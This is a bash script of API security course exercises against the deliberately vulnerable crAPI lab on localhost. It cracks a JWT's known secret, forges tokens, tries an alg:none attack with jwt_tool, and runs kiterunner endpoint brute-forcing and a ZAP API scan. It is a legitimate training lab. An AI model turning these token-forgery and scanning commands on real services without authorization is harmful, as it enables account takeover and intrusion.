#!/usr/bin/env bash
# =============================================================================
# Module 3.5 — API Security: Tool Exercises
# Run from your Mac with crAPI already running on localhost:8888
#
# Usage:
#   chmod +x run-exercises.sh
#   ./run-exercises.sh
#
# Or run individual sections manually (see comments below each section).
# =============================================================================

set -euo pipefail
CRAPI="http://localhost:8888"
MAILHOG="http://localhost:8025"

echo ""
echo "==========================================="
echo " Module 3.5 — API Security Tool Exercises"
echo "==========================================="
echo ""

# ---------------------------------------------------------------------------
# PRE-FLIGHT: verify crAPI is running
# ---------------------------------------------------------------------------
echo "[*] Checking crAPI is up..."
if ! curl -sf "$CRAPI/identity/api/auth/login" -o /dev/null 2>&1; then
  echo "[!] crAPI is NOT reachable at $CRAPI"
  echo "    Start it first:  docker compose up -d"
  exit 1
fi
echo "[+] crAPI is up at $CRAPI"
echo ""

# ---------------------------------------------------------------------------
# STEP 1 — Register a test user and grab a JWT
# ---------------------------------------------------------------------------
echo "=== STEP 1: Register test user & get JWT ==="
REGISTER=$(curl -sf -X POST "$CRAPI/identity/api/auth/signup" \
  -H "Content-Type: application/json" \
  -d '{"name":"JwtTest","email":"jwttest@lab.local","number":"1234567890","password":"Password1!"}')
echo "[*] Register response: $REGISTER"

echo ""
echo "[*] Logging in..."
LOGIN=$(curl -sf -X POST "$CRAPI/identity/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"jwttest@lab.local","password":"Password1!"}')
echo "[*] Login response: $LOGIN"

TOKEN=$(echo "$LOGIN" | python3 -c "import sys,json; print(json.load(sys.stdin).get('token',''))" 2>/dev/null || true)
if [ -z "$TOKEN" ]; then
  echo "[!] Could not extract token — check login response above and set TOKEN manually:"
  echo "    export TOKEN=<paste_token_here>"
else
  echo "[+] TOKEN extracted: ${TOKEN:0:50}..."
  export TOKEN
fi
echo ""

# ---------------------------------------------------------------------------
# STEP 2 — jwt_tool: decode, crack, and alg:none attack
#
# Install:  pip3 install jwt_tool  (or: pipx install jwt_tool)
# ---------------------------------------------------------------------------
echo "=== STEP 2: jwt_tool exercises ==="

if ! command -v jwt_tool &>/dev/null; then
  echo "[!] jwt_tool not found. Installing..."
  pip3 install jwt_tool --break-system-packages 2>/dev/null || pip3 install jwt_tool
fi

echo ""
echo "--- 2a: Decode token (no verification) ---"
jwt_tool "$TOKEN" 2>/dev/null || echo "[!] Run manually: jwt_tool \$TOKEN"

echo ""
echo "--- 2b: Crack secret (known: 'crapi') ---"
echo "crapi" > /tmp/jwt_wordlist.txt
jwt_tool "$TOKEN" -C -d /tmp/jwt_wordlist.txt 2>/dev/null || \
  echo "[!] Run manually: jwt_tool \$TOKEN -C -d /tmp/jwt_wordlist.txt"

echo ""
echo "--- 2c: Forge token with known secret ---"
jwt_tool "$TOKEN" -S hs256 -p "crapi" 2>/dev/null || \
  echo "[!] Run manually: jwt_tool \$TOKEN -S hs256 -p 'crapi'"

echo ""
echo "--- 2d: alg:none attack (unsigned token) ---"
jwt_tool "$TOKEN" -X a 2>/dev/null || \
  echo "[!] Run manually: jwt_tool \$TOKEN -X a"

echo ""

# ---------------------------------------------------------------------------
# STEP 3 — kiterunner: API endpoint discovery
#
# Install:  brew install kiterunner
#           OR: go install github.com/assetnote/kiterunner/cmd/kr@latest
#
# Wordlists: https://wordlists.assetnote.io/ — grab routes-large.kite
# ---------------------------------------------------------------------------
echo "=== STEP 3: kiterunner endpoint discovery ==="

if ! command -v kr &>/dev/null; then
  echo "[!] kiterunner (kr) not found."
  echo "    Install: brew install kiterunner"
  echo "    Or:      go install github.com/assetnote/kiterunner/cmd/kr@latest"
  echo ""
  echo "    Then re-run this section, or run manually:"
  echo "    kr scan $CRAPI/identity -A=apiroutes-240528.kite --fail-status-codes 401,403,404 -o text"
  echo ""
else
  # Download wordlist if not present
  WORDLIST="$HOME/.kiterunner/routes-small.kite"
  if [ ! -f "$WORDLIST" ]; then
    echo "[*] Downloading routes-small.kite wordlist..."
    mkdir -p "$HOME/.kiterunner"
    curl -L "https://wordlists-cdn.assetnote.io/data/kiterunner/routes-small.kite" \
      -o "$WORDLIST" 2>/dev/null && echo "[+] Downloaded" || \
      echo "[!] Download failed — try manually from https://wordlists.assetnote.io/"
  fi

  if [ -f "$WORDLIST" ]; then
    echo "[*] Scanning crAPI identity service..."
    kr scan "$CRAPI/identity" -A="$WORDLIST" \
      --fail-status-codes 400,401,403,404,429,500 \
      -o text 2>&1 | tee /tmp/kiterunner-identity.txt
    echo ""
    echo "[*] Scanning crAPI community service..."
    kr scan "$CRAPI/community" -A="$WORDLIST" \
      --fail-status-codes 400,401,403,404,429,500 \
      -o text 2>&1 | tee /tmp/kiterunner-community.txt
    echo "[+] Results saved to /tmp/kiterunner-identity.txt and /tmp/kiterunner-community.txt"
  fi
fi
echo ""

# ---------------------------------------------------------------------------
# STEP 4 — ZAP API scan with crAPI OpenAPI spec
#
# Prerequisites:
#   - OWASP ZAP installed (already on lab Mac)
#   - crAPI OpenAPI spec extracted from container:
#       docker cp $(docker ps -qf name=crapi-web-1):/app/resources/crapi-openapi-spec.json /tmp/crapi-openapi-spec.json
#
# ZAP Docker alternative (no GUI needed):
#   docker pull ghcr.io/zaproxy/zaproxy:stable
# ---------------------------------------------------------------------------
echo "=== STEP 4: ZAP API scan with OpenAPI spec ==="

echo "[*] Extracting OpenAPI spec from crAPI container..."
CONTAINER=$(docker ps --format '{{.Names}}' 2>/dev/null | grep -i "crapi.*web\|web.*crapi" | head -1 || true)
if [ -z "$CONTAINER" ]; then
  CONTAINER=$(docker ps --format '{{.Names}}' 2>/dev/null | grep "8888" | head -1 || \
    docker ps -qf "publish=8888" 2>/dev/null | head -1 || true)
fi

if [ -n "$CONTAINER" ]; then
  docker cp "$CONTAINER:/app/resources/crapi-openapi-spec.json" /tmp/crapi-openapi-spec.json 2>/dev/null && \
    echo "[+] OpenAPI spec saved to /tmp/crapi-openapi-spec.json" || \
    echo "[!] Could not extract spec from $CONTAINER — try: docker ps (find crAPI web container name)"
else
  echo "[!] Could not identify crAPI web container automatically."
  echo "    Run: docker ps | grep crapi"
  echo "    Then: docker cp <container_name>:/app/resources/crapi-openapi-spec.json /tmp/crapi-openapi-spec.json"
fi

echo ""
echo "[*] ZAP API scan command (run after spec is extracted):"
echo ""
echo "    # Option A — ZAP Docker (no GUI, recommended for automation):"
echo "    docker run --rm --network host \\"
echo "      ghcr.io/zaproxy/zaproxy:stable zap-api-scan.py \\"
echo "      -t /tmp/crapi-openapi-spec.json \\"
echo "      -f openapi \\"
echo "      -T 120 \\"
echo "      -r /tmp/zap-api-report.html"
echo ""
echo "    # Option B — ZAP installed locally (adjust path):"
echo "    /Applications/ZAP.app/Contents/Java/zap-api-scan.py \\"
echo "      -t $CRAPI/identity/api/openapi-docs \\"
echo "      -f openapi \\"
echo "      -r /tmp/zap-api-report.html"
echo ""
echo "    # Open report:"
echo "    open /tmp/zap-api-report.html"
echo ""

# ---------------------------------------------------------------------------
# STEP 5 — BONUS: vAPI (additional vulnerable API target)
#
# vAPI is a self-hosted vulnerable API (different from crAPI).
# Source: https://github.com/roottusk/vapi
# ---------------------------------------------------------------------------
echo "=== STEP 5 (Bonus): vAPI setup ==="
echo ""
echo "    git clone https://github.com/roottusk/vapi.git /tmp/vapi"
echo "    cd /tmp/vapi"
echo "    docker compose up -d"
echo "    # vAPI runs on http://localhost:80"
echo "    # Import the Postman collection from /tmp/vapi/postman/"
echo "    # Run kiterunner against it:"
echo "    kr scan http://localhost/vapi -A=$HOME/.kiterunner/routes-small.kite -o text"
echo ""

echo "==========================================="
echo " Done. Review outputs above and in /tmp/"
echo "==========================================="
